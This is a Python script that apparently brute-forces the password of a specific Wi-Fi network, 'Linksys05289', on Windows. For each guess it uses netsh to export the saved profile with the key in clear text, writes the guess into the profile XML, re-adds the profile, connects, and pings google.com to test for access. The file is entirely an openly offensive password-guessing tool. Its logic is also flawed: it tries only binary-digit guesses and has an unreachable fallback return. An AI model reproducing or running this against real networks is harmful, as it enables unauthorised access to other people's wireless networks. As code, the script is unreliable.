from subprocess import call
from subprocess import check_output
from os import listdir
from os.path import isfile, join
import xmltodict
from dicttoxml import dicttoxml
from subprocess import Popen, PIPE

import time

words = [

]

def try_connect(ssid, verbose = False):

    for guess in range(10000000,11111111):
        guess = str(guess)
        if((guess[0]=="0" or guess[0]=="1") and (guess[1]=="0" or guess[1]=="1") and (guess[2]=="0" or guess[2]=="1")and (guess[3]=="0" or guess[3]=="1")
        and (guess[4]=="0" or guess[4]=="1") and (guess[5]=="0" or guess[5]=="1") and (guess[6]=="0" or guess[6]=="1") and (guess[7]=="0" or guess[7]=="1")):



              print(guess)
              if(_connectone(ssid,guess,1,verbose)):

                  return(guess)
                  return "no ssid found"






import shlex
from subprocess import Popen, PIPE

def get_exitcode_stdout_stderr(cmd):
    """
    Execute the external command and get its exitcode, stdout and stderr.
    """
    args = shlex.split(cmd)

    proc = Popen(args, stdout=PIPE, stderr=PIPE)
    out, err = proc.communicate()
    exitcode = proc.returncode
    #
    return exitcode, out, err
def test_on_network(ssid,verbose=False):
    exitcode,output,error = get_exitcode_stdout_stderr("ping google.com")
    #output = str(check_output("netsh wlan show interfaces"))
    output = str(output)
    if(verbose):
        print(output.replace('\\r\\n','\r\n'))
    return not "could not find host" in output
def _findxml():
    mypath = "./"

    onlyxmlfiles = [f for f in listdir(mypath) if (isfile(join(mypath, f))and f.lower().endswith(".xml"))]
    if(len(onlyxmlfiles)== 1):
        return onlyxmlfiles[0]
    else:
        return "yourxml was not found!"
def _replacepassword(password,xmlfile):
    with open(xmlfile) as fd:
        doc = xmltodict.parse(fd.read())
    doc['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial'] = password

    xml = xmltodict.unparse(doc, pretty=True)
    f = open(xmlfile, 'w')
    f.write(str(xml))
    f.close()

def _connectone(ssid,password, timetosleep=5,verbose=False):
    exportprofile='netsh wlan export profile name="{0}" folder= "{1}" key=clear '.format(ssid,".")
    call (exportprofile)
    xmlfile = _findxml()
    _replacepassword(password,xmlfile)

    removenetwork = 'netsh wlan delete profile name="'+ssid+'"'
    call (removenetwork)

    addnetwork = 'netsh wlan add profile filename="'+xmlfile+'"'
    call (addnetwork)

    #setnetwork = 'netsh wlan set hostednetwork mode=allow ssid="{0}" key="{1}"'.format(ssid,password)
    #call (setnetwork)

    connect = 'netsh wlan connect name="'+ ssid + '"'
    call(connect)

    time.sleep(timetosleep)
    connected = test_on_network(ssid,True)
    print(connected)
    return connected

print("Searching for password\n...\n...\n...")
print(try_connect("Linksys05289",verbose=True))
